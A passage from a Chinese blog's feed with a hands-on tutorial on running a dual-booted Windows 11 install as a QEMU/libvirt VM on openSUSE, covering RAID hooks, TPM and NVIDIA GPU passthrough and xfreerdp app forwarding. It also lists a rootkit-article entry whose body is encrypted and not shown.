class="hljs-string">&quot;0x0&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">disk</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>然后重新把我们的 Windows 安装光碟与 virtio 驱动挂上去，放到第一个启动：</p><blockquote><p>注：你需要在启动时 <code>press any key</code> 才会从 CDROM 启动</p></blockquote><p><img src="https://s2.loli.net/2024/02/24/CKQAUWexdacbl3m.png"></p><p>重启后首先按惯例进入安装界面装载 virtio 驱动：</p><p><img src="https://s2.loli.net/2024/02/24/ekb9Qsd82oOc1Nf.png"></p><p>完成后 <code>shift + f10</code> 唤出 cmd，在 <code>diskpart</code> 中找到 EFI 分区，分配驱动号 <code>B</code>：</p><p><img src="https://s2.loli.net/2024/02/24/KOLZMNRl1o6iu3q.png"></p><p>最后通过如下命令将 virtio 驱动注入 C 盘，并在 EFI 分区中配置好启动项：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">dism /image:c:\ /add-driver /driver:e:\viostor\w11\amd64\viostor.inf<br>bcdboot C:\Windows /s B: /f ALL<br></code></pre></td></tr></table></figure><p>重启，重新进行账户验证，然后就是见证奇迹的时刻——</p><p><img src="https://s2.loli.net/2024/02/24/P4IqVFUflRMNtsa.png" alt="唉👴的桌面这么私密的空间都给大家看了.jpg"></p><h3 id="通过-libvirt-hook-配置-RAID-自创建与卸载"><a href="#通过-libvirt-hook-配置-RAID-自创建与卸载" class="headerlink" title="通过 libvirt hook 配置 RAID 自创建与卸载"></a>通过 libvirt hook 配置 RAID 自创建与卸载</h3><p>RAID 的配置不能持久化，因此需要我们写一个脚本来在每次启动 VM 前先检查是否创建了 RAID，若否，则先创建 RAID 再启动</p><p>这里我们可以通过创建 <code>/etc/libvirt/hooks/qemu</code> 脚本来实现 VM 启动前的 hook，在其中写入如下内容即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>VM_NAME=<span class="hljs-string">&quot;Windows11PhysVM&quot;</span><br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$1</span> == <span class="hljs-variable">$VM_NAME</span> ]] &amp;&amp; [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> || <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;stopped&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>   <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>     <span class="hljs-comment"># startup logic here</span><br>     modprobe loop<br>     modprobe linear<br>     LOOP1=$(sudo losetup -f)<br>     losetup <span class="hljs-variable">$&#123;LOOP2&#125;</span>  /home/arttnba3/Desktop/VM/win11vm/disk/gpt<br>     LOOP2=$(sudo losetup -f)<br>     losetup <span class="hljs-variable">$&#123;LOOP2&#125;</span>  /home/arttnba3/Desktop/VM/win11vm/disk/efi1<br>     LOOP3=$(sudo losetup -f)<br>     losetup <span class="hljs-variable">$&#123;LOOP3&#125;</span>  /home/arttnba3/Desktop/VM/win11vm/disk/efi2<br>     mdadm --build --verbose /dev/md0 --chunk=512 --level=linear --raid-devices=6 /dev/loop0 /dev/loop1 /dev/nvme0n1p2 /dev/nvme0n1p3 /dev/nvme0n1p4 /dev/loop2<br>   <span class="hljs-keyword">else</span><br>     <span class="hljs-comment"># shutdown logic here</span><br>     <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Stopping array&quot;</span><br>     mdadm --stop /dev/md0<br>     <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;removing loopback devices&quot;</span><br>     losetup | grep -i <span class="hljs-string">&quot;win11vm&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs sudo losetup -d<br>   <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h3 id="配置-TPM-直通"><a href="#配置-TPM-直通" class="headerlink" title="配置 TPM 直通"></a>配置 TPM 直通</h3><p><strong>可信平台模块</strong>（<a href="https://learn.microsoft.com/zh-cn/windows/security/hardware-security/tpm/trusted-platform-module-overview">Trusted Platform Module</a>）芯片是主板上的一块用来确保物理安全性的芯片，Windows 用其确保系统的物理安全性，包括 Pin 码等，自 Win 11 起 TPM 成为了操作系统启动的硬性要求</p><p>QEMU 虽然可以模拟 vTPM，但是与物理机 TPM 的非一致性会让系统在 Win 物理机与虚拟机间切换时造成一定的问题（在 Windows 看来这破坏了系统的完整性），由于在 Linux PC 上我们通常并不使用 TPM 特性，因此这里我们可以选择直接将 TPM 模块直通给虚拟机</p><p>TPM 模块的设备路径通常为 <code>/dev/tpm0</code> （v1.2）与 <code>/dev/tpmrm0</code> （v2.0），通常我们应当将前者进行直通才能达到完整直通的效果：</p><p><img src="https://s2.loli.net/2024/02/26/wnPzW97uJxqKXFI.png" alt="真是简简又单单，你们有没有这样的 virt-manager 啊">)</p><p>然后就能用 pin 登录了：</p><p><img src="https://s2.loli.net/2024/02/28/GFo179iyWNLetIX.png"></p><h3 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a><em>可能遇到的问题</em></h3><ul><li>Host 重启至 Windows 后 WLAN 适配器丢失：在网络适配器里卸载 Kernel Mode Debugger，然后在管理里选择无线网卡设备，<strong>卸载设备</strong>，扫描设备更改，然后右键桌面右下角网络图标打开 <code>诊断网络问题 </code>，启用 WLAN 适配器即可</li></ul><h1 id="0x02-在-Host-侧配置-RDP-连接"><a href="#0x02-在-Host-侧配置-RDP-连接" class="headerlink" title="0x02. 在 Host 侧配置 RDP 连接"></a>0x02. 在 Host 侧配置 RDP 连接</h1><h2 id="配置-RDP-硬体加速"><a href="#配置-RDP-硬体加速" class="headerlink" title="配置 RDP 硬体加速"></a>配置 RDP 硬体加速</h2><p>运行 <code>gpedit.msc</code> 找到 <code>*计算机配置-&gt;管理模板-&gt;Windows组件-&gt;远程桌面服务-&gt;远程桌面会话主机-&gt;远程会话环境</code>，在其中配置 RDP 硬体加速，以此获得更好的 RDP 性能：</p><p><img src="https://s2.loli.net/2024/02/26/ILEM9OrqKZFApou.png"></p><p>然后打开注册表编辑器路径 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations</code> ，新建一个名为 <code>DWMFRAMEINTERVAL</code> 的 DWORD 值并设为 <code>15</code>：</p><p><img src="https://s2.loli.net/2024/02/26/gXABCzNwMH8KRYE.png"></p><p>重启即可</p><h2 id="配置-RDP-连接"><a href="#配置-RDP-连接" class="headerlink" title="配置 RDP 连接"></a>配置 RDP 连接</h2><blockquote><p>如果你的 RDP 连接没有声音，可以参见 <a href="https://www.anyviewer.cn/how-to/rdp-audio-not-working-6540.html">这个链接</a> 进行修复</p><p>如果无法连接上 Guest ，也可以检查一下是不是 Windows 防火墙的问题</p></blockquote><h3 id="使用-xfreerdp-仅运行单个应用"><a href="#使用-xfreerdp-仅运行单个应用" class="headerlink" title="使用 xfreerdp 仅运行单个应用"></a>使用 xfreerdp 仅运行单个应用</h3><p>首先安装上 freedrp：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> freerdp</span><br></code></pre></td></tr></table></figure><p>接下来输入如下命令进行测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">xfreerdp /rfx /d:<span class="hljs-string">&quot;你的 VM 主机名&quot;</span> /u:<span class="hljs-string">&quot;你的 VM 用户名&quot;</span> /p:<span class="hljs-string">&quot;你的 VM 密码&quot;</span> /v:<span class="hljs-string">&quot;你的 VM 的 IP&quot;</span> +auto-reconnect +home-drive +clipboard /scale:100 /dynamic-resolution /audio-mode:0 /microphone /app:<span class="hljs-string">&quot;explorer.exe&quot;</span></span><br></code></pre></td></tr></table></figure><p>接下来就是见证奇迹的时刻——</p><p><img src="https://s2.loli.net/2024/02/22/GgCDkhwiznLF1fZ.png" alt="碉堡了好吗"></p><p>这里的 RDP 命令帮我们配置好了共享 <code>/home</code> 文件夹和剪贴板，所以你可以<strong>直接往 VM 里粘贴包括文件在内的东西</strong>，也可以在 VM 中访问 Host 侧的文件夹：）</p><blockquote></blockquote><h3 id="使用-sdl-freerdp"><a href="#使用-sdl-freerdp" class="headerlink" title="使用 sdl-freerdp"></a><em>使用 sdl-freerdp</em></h3><blockquote><p>和 wlfreerdp 一样，不支持仅转发单个应用（似乎是 wayland 缺失了某些特性）</p></blockquote><p>zypper 官方源里没有，可以手动添加，也可以像笔者一样通过 flatpak 进行安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak install com.freerdp.FreeRDP</span><br></code></pre></td></tr></table></figure><p>然后运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak run com.freerdp.FreeRDP /rfx /d:<span class="hljs-string">&quot;你的 VM 主机名&quot;</span> /u:<span class="hljs-string">&quot;你的 VM 用户名&quot;</span> /p:<span class="hljs-string">&quot;你的 VM 密码&quot;</span> /v:<span class="hljs-string">&quot;你的 VM 的 IP&quot;</span> +auto-reconnect +home-drive +clipboard /scale:100 /dynamic-resolution /audio-mode:0 /microphone</span><br></code></pre></td></tr></table></figure><h3 id="在应用列表中添加-Windows-程序图标"><a href="#在应用列表中添加-Windows-程序图标" class="headerlink" title="在应用列表中添加 Windows 程序图标"></a>在应用列表中添加 Windows 程序图标</h3><p>把自己想要运行的 Windows 程序路径写成 Desktop Entry 就行，后缀名改为 <code>.desktop</code> 并放在 <code>/usr/share/applicaitions/</code> 目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[Desktop Entry]<br><span class="hljs-comment"># 该入口的类型</span><br>Type=Application<br><span class="hljs-comment"># 是否显示终端（可选）</span><br>Terminal=<span class="hljs-literal">false</span><br><span class="hljs-comment"># 点击该入口执行的命令</span><br>Exec=xfreerdp /rfx /d:<span class="hljs-string">&quot;你的 VM 主机名&quot;</span> /u:<span class="hljs-string">&quot;你的 VM 用户名&quot;</span> /p:<span class="hljs-string">&quot;你的 VM 密码&quot;</span> /v:<span class="hljs-string">&quot;你的 VM 的 IP&quot;</span> +auto-reconnect +home-drive +clipboard /scale:100 /dynamic-resolution /audio-mode:0 /microphone /app:<span class="hljs-string">&quot;VM 里的可执行程序路径名&quot;</span><br><span class="hljs-comment"># 该程序名称</span><br>Name=Name of Application<br><span class="hljs-comment"># 入口显示的图标路径（可选）</span><br>Icon=/path/to/icon<br></code></pre></td></tr></table></figure><h1 id="0x03-实现显卡直通-，这样就能玩👴最爱的-Genshin-Impact-了"><a href="#0x03-实现显卡直通-，这样就能玩👴最爱的-Genshin-Impact-了" class="headerlink" title="0x03. 实现显卡直通 ，这样就能玩👴最爱的 Genshin Impact 了"></a>0x03. 实现显卡直通 <del>，这样就能玩👴最爱的 <code>Genshin Impact</code> 了</del></h1><blockquote><p>参考 <a href="https://doc.opensuse.org/documentation/leap/virtualization/html/book-virtualization/app-gpu-passthru.html">SUSE - Configuring GPU Pass-Through for NVIDIA cards</a></p></blockquote><p>众所周知，《原神》是由米哈游自主研发的一款全新开放世界冒险游戏。游戏发生在一个被称作「提瓦特」的幻想世界，在这里，被神选中的人将被授予「神之眼」，导引元素之力。你将扮演一位名为「旅行者」的神秘角色，在自由的旅行中邂逅性格各异、能力独特的同伴们，和他们一起击败强敌，找回失散的亲人——同时，逐步发掘「原神」的真相。我现在每天玩原神都能赚150原石，每个月差不多5000原石的收入， 也就是现实生活中每个月5000美元的收入水平，换算过来最少也30000人民币，虽然我 只有14岁，但是已经超越了中国绝大多数人(包括你)的水平，这便是原神给我的骄傲的资本…</p><p><img src="https://s2.loli.net/2024/02/22/kNXAmoqZslUjEYb.png" alt="差不多得了😅屁大点事都要拐上原神，原神一没招你惹你，二没干伤天害理的事情，到底怎么你了让你一直无脑抹黑，米哈游每天费尽心思的文化输出弘扬中国文化，你这种喷子只会在网上敲键盘诋毁良心公司，中国游戏的未来就是被你这种人毁掉的😅"></p><p><del>扯得有些远了，</del> 总而言之有的时候我们想要在 Windows 上进行一些需要用显卡才能完成的任务，亦或是使用显卡进行图形加速等，virt-manager 默认提供的 RedHat QXL 终究只是一个由 QEMU 进行模拟的设备，性能上自然很难与真正的显卡相比拟</p><p>而笔者的笔记本刚好有两个显卡：一个是 Intel 的核显，另一个是一张 NVIDIA 的卡，因为笔者日常也不用这台电脑炼丹（ <del>再说了就一张小破 4060 能练个啥玩意出来</del> ），因此笔者决定将 N 卡直通到 VM 当中以提高 VM 的图形化性能， <del>同时闲暇之余还能打开 VM 玩玩游戏这样子</del></p><h2 id="配置-IOMMU"><a href="#配置-IOMMU" class="headerlink" title="配置 IOMMU"></a>配置 IOMMU</h2><p>在 <a href="https://arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/">《系统虚拟化导论》</a> 中我们知道集成在北桥上的 IOMMU 可以通过 DMA 重映射与中断重映射的方式让我们实现 I&#x2F;O 虚拟化：</p><p><img src="https://s2.loli.net/2022/09/03/k8mOSalVRWtseMi.png"></p><p>IOMMU 默认是关闭的，因此首先我们要先启用 IOMMU 这一功能，首先检查一下你是否有两张卡以及是否在 UEFI 里开启了虚拟化相关特性：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">dmesg | grep -e <span class="hljs-string">&quot;Directed I/O&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci | grep -i <span class="hljs-string">&quot;vga&quot;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/22/SKYOdgF1s9U2Za4.png" alt="image.png"></p><blockquote><p>如果你只有一张显示卡的话，<strong>那笔者不推荐弄显卡直通</strong>，因为同一时间只有一个系统能够占用显卡，Guest 拿掉之后 Host 肯定是没有图形输出的，Guest 关机后才能回到 Host 图形界面，<strong>这种直通还不如直接装双系统后重启回 Windows</strong></p></blockquote><p>在 <code>/etc/default/grub</code> 的 <code>GRUB_CMDLINE_LINUX_DEFAULT</code> 参数中添加 <code>intel_iommu=on iommu=pt rd.driver.pre=vfio-pci</code> （AMD CPU 则添加 <code>iommu=pt amd_iommu=on rd.driver.pre=vfio-pci</code>），之后通过如下命令更新 grub：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo grub2-mkconfig -o /boot/grub2/grub.cfg</span> <br></code></pre></td></tr></table></figure><p>重启后通过 <code>dmesg |  grep -e DMAR -e IOMMU</code> 命令我们便能看到 IOMMU 已经开启：</p><p><img src="https://s2.loli.net/2024/02/22/kDgealrxURMKE6d.png" alt="image.png"></p><p>接下来我们运行 <code>lspci -nn | grep -i nvidia</code> 命令找到 N 卡后面的设备 id,记录下这串数字：</p><p><img src="https://s2.loli.net/2024/02/22/fNKQEu2z8VSoHOv.png" alt="image.png"></p><h2 id="实现显卡动态直通"><a href="#实现显卡动态直通" class="headerlink" title="实现显卡动态直通"></a>实现显卡动态直通</h2><p>大部分双显卡直通的教程上来就是让把老 N 卡的 nouveau 驱动给卸了，但是笔者<a href="https://arttnba3.cn/2023/11/24/DISTRO-0X01-INSTALL_TUMBLEWEED_WINDOWS/">一开始就装了 N 卡闭源驱动</a>，现在再给卸了有点不太现实，而且万一以后有空了也想用这台电脑小练点丹也说不定，所以这里笔者选择配置<strong>动态显卡重装载策略</strong>——</p><ul><li>默认卸载 N 卡驱动，在需要时再装载 N 卡驱动</li><li>在 VM 启动时卸载 N 卡驱动，在 VM 结束运行后再重新装载，<strong>桌面环境则仅在核显上运行</strong>（其实 Linux 桌面环境通常情况下用核显的性能基本上都是足够的）</li></ul><h3 id="配置-VFIO"><a href="#配置-VFIO" class="headerlink" title="配置 VFIO"></a>配置 VFIO</h3><p>首先配置 VFIO，这里我们要防止 nvidia 驱动在开机时便被装载（后面用到再手动装载，否则会比较麻烦），首先在 <code>/etc/modprobe.d/</code> 中创建文件 <code>vfio.conf</code> 并写入我们刚刚获取到的标识符：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">options</span> vfio-pci ids=<span class="hljs-number">10</span>de:<span class="hljs-number">28</span>a0<br></code></pre></td></tr></table></figure><p>然后创建文件 <code>/etc/dracut.conf.d/gpu-passthrough.conf</code> 以装载 <a href="https://documentation.suse.com/zh-cn/sles/15-SP3/html/SLES-all/gloss-vt-glossary.html#gloss-vt-acronym-vfio">VFIO</a> 驱动：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">add_drivers+=<span class="hljs-string">&quot;vfio vfio_iommu_type1 vfio_pci vfio_virqfd&quot;</span><br></code></pre></td></tr></table></figure><p>接下来使用 dracut 重新生成 initrd：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo dracut --force /boot/initrd $(uname -r)<br></code></pre></td></tr></table></figure><p>然后为 Guest VM 禁用 MSR（防止崩溃），创建 <code>/etc/modprobe.d/kvm.conf</code> 文件并写入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">options</span> kvm ignore_msrs=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>重启电脑后你就会发现 N 卡驱动载入失败，因为此时 VFIO 先一步取得了N 卡的所有权：）</p><p><img src="https://s2.loli.net/2024/02/25/xZzI4O9J5niXDqf.png"></p><p>如果你想再用上 N 卡闭源驱动搞事情，可以通过如下脚本装载回 N 卡驱动，这里我们用 <code>virsh</code> 来重新装载设备，注意查看 N 卡对应的 pci 号设备：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>sudo modprobe -r vfio-pci<br>virsh nodedev-reattach pci_0000_01_00_0<br>sudo modprobe nvidia<br>sudo modprobe nvidia_modeset<br>sudo modprobe nvidia_uvm<br>sudo modprobe nvidia_drm<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/25/sfDjCAB149aK5Ye.png"></p><p>重新用回 VFIO 的话就是反着来的脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>sudo modprobe -r nvidia_drm<br>sudo modprobe -r nvidia_uvm<br>sudo modprobe -r nvidia_modeset<br>sudo modprobe -r nvidia<br>virsh nodedev-detach pci_0000_01_00_0<br>sudo modprobe vfio-pci<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/25/PDVGtKZJ3TSujkF.png"></p><h3 id="配置显卡直通"><a href="#配置显卡直通" class="headerlink" title="配置显卡直通"></a>配置显卡直通</h3><p>接下来我们将这张卡通进 VM 中，首先用如下脚本查看显卡所在 IOMMU 组都有哪些设备：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">shopt</span> -s nullglob<br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> /sys/kernel/iommu_groups/*/devices/*; <span class="hljs-keyword">do</span> <br>    n=<span class="hljs-variable">$&#123;d#*/iommu_groups/*&#125;</span>; n=<span class="hljs-variable">$&#123;n%%/*&#125;</span><br>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;IOMMU Group %s &#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$n</span>&quot;</span><br>    lspci -nns <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;d##*/&#125;</span>&quot;</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/25/uWZP85BcjrdQs7x.png" alt="比较幸运的是笔者的 N 卡所在组只有一个设备"></p><p>接下来在 virt-manager 中添加 <code>PCI Host Device</code> 选<strong>显卡所在的整个 IOMMU group 设备</strong>即可：</p><p><img src="https://s2.loli.net/2024/02/25/AKMU9xRwONFc4jC.png" alt="小学生都会做"></p><blockquote><p>启动前注意把 Video 换成 <code>virtio</code> 而非 <code>QXL</code> ，否则在 SPICE 服务启动后鼠标没法正常工作：(</p></blockquote><p>之后就完成直通了：</p><p><img src="https://s2.loli.net/2024/02/26/9Ycy386z1DJwiWB.png"></p><p><img src="https://s2.loli.net/2024/02/25/LVaHAEvjuQZhdqy.png"></p><p>如果你和笔者一样电脑自带的视频输出口都走独显，则可以通过外接显示器直接输出虚拟机内容，这样就不需要忍受 virtio&#x2F;qxl 那极其底下的性能了：</p><p><img src="https://s2.loli.net/2024/02/28/5mcCALesxZbzUfq.jpg"></p><h3 id="配置-libvirt-hook-动态装载显卡"><a href="#配置-libvirt-hook-动态装载显卡" class="headerlink" title="配置 libvirt hook 动态装载显卡"></a>配置 libvirt hook 动态装载显卡</h3><p>我们只需要将前面的两个脚本写到  <code>/etc/libvirt/hooks/qemu</code> 脚本中即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>VM_NAME=<span class="hljs-string">&quot;Windows11PhysVM&quot;</span><br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$1</span> == <span class="hljs-variable">$VM_NAME</span> ]] &amp;&amp; [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> || <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;stopped&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>   <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>     sudo modprobe -r nvidia_drm<br>     sudo modprobe -r nvidia_uvm<br>     sudo modprobe -r nvidia_modeset<br>     sudo modprobe -r nvidia<br>     virsh nodedev-detach pci_0000_01_00_0<br>     sudo modprobe vfio-pci<br>   <span class="hljs-keyword">else</span><br>     sudo modprobe -r vfio-pci<br>     virsh nodedev-reattach pci_0000_01_00_0<br>     sudo modprobe nvidia<br>     sudo modprobe nvidia_modeset<br>     sudo modprobe nvidia_uvm<br>     sudo modprobe nvidia_drm<br>   <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h3 id="在虚拟机里玩原神-（To-do）"><a href="#在虚拟机里玩原神-（To-do）" class="headerlink" title="在虚拟机里玩原神 （To do）"></a><em><del>在虚拟机里玩原神</del></em> （To do）</h3><p><del>最后自然就是大家最喜欢的，原神，启动——</del> 家人们大事不妙了，👴发现原神有 VM 检测， <del>今天玩不了了，咱们下回再见吧</del></p><p><img src="https://s2.loli.net/2024/02/28/JcLyUmIOVAjeYv2.png"></p><h1 id="0x04-一些亟待解决的小问题"><a href="#0x04-一些亟待解决的小问题" class="headerlink" title="0x04. 一些亟待解决的小问题"></a>0x04. 一些亟待解决的小问题</h1><h2 id="虚拟化组件问题汇总"><a href="#虚拟化组件问题汇总" class="headerlink" title="虚拟化组件问题汇总"></a>虚拟化组件问题汇总</h2><h3 id="1-libvirtd-不会自启动"><a href="#1-libvirtd-不会自启动" class="headerlink" title="1. libvirtd 不会自启动"></a>1. libvirtd 不会自启动</h3><p>似乎是因为 libvirtd 被拆成了数个小组件，所以不管怎么 <code>enable</code> 都没法让他自启动，但是 libvirtd 不启动的话 virtiofsd 也没法正常工作，因此暂时还需要每次启动后都得手动 <code>systemctl start libvirtd.service</code></p><h2 id="xfreerdp-问题综合汇总"><a href="#xfreerdp-问题综合汇总" class="headerlink" title="xfreerdp 问题综合汇总"></a>xfreerdp 问题综合汇总</h2><h3 id="1-存在画面撕裂"><a href="#1-存在画面撕裂" class="headerlink" title="1. 存在画面撕裂"></a>1. 存在画面撕裂</h3><p>尤其是在仅转发单个应用而非整个桌面时</p><h3 id="2-新开单应用转发导致所有窗口重新开启"><a href="#2-新开单应用转发导致所有窗口重新开启" class="headerlink" title="2. 新开单应用转发导致所有窗口重新开启"></a>2. 新开单应用转发导致所有窗口重新开启</h3><p>其实桌面都在同一个 session 里，但是 xfreerdp 需要重新建一遍窗口，感觉是设计上的缺陷 ：(</p><h3 id="3-app-参数纯后台应用无法保持窗口留存"><a href="#3-app-参数纯后台应用无法保持窗口留存" class="headerlink" title="3. /app 参数纯后台应用无法保持窗口留存"></a>3. <code>/app</code> 参数纯后台应用无法保持窗口留存</h3><p>开个酷狗&#x2F;网易云之类的窗口一关 RDP 连接就也没了，感觉还是设计上的缺陷 ：(</p><h2 id="不能玩-👴-最爱的-Genshin-Impact"><a href="#不能玩-👴-最爱的-Genshin-Impact" class="headerlink" title="不能玩 👴 最爱的 Genshin Impact"></a><del>不能玩 👴 最爱的 Genshin Impact</del></h2><p>原神似乎用了比较严苛的虚拟化检查方案，所以这个后日再议了（笑）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;4202 年了，Linux Desktop 还会好吗？&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="https://arttnba3.github.io/categories/VIRTUALIZATION/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="openSUSE" scheme="https://arttnba3.github.io/tags/openSUSE/"/>
    
    <category term="openSUSE Tumbleweed" scheme="https://arttnba3.github.io/tags/openSUSE-Tumbleweed/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>【VIRUS.0x00】现代 Linux rootkit 开发导论</title>
    <link href="https://arttnba3.github.io/2024/01/01/VIRUS-0X00-LINUX_ROOTKIT/"/>
    <id>https://arttnba3.github.io/2024/01/01/VIRUS-0X00-LINUX_ROOTKIT/</id>
    <published>2023-12-31T17:21:32.000Z</published>
    <updated>2024-12-25T13:23:14.876Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="没写完，别急，急的话可以先看先知上的半成品" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="7150e2cd99784e241b9be7571fe98ad76034d289c0a6340ae61d67496b6988bf"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">没写完，别急，急的话可以先看先知上的半成品</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">本文首发于先知社区：https://xz.aliyun.com/t/12439</summary>
    
    
    
    <category term="VIRUS" scheme="https://arttnba3.github.io/categories/VIRUS/"/>
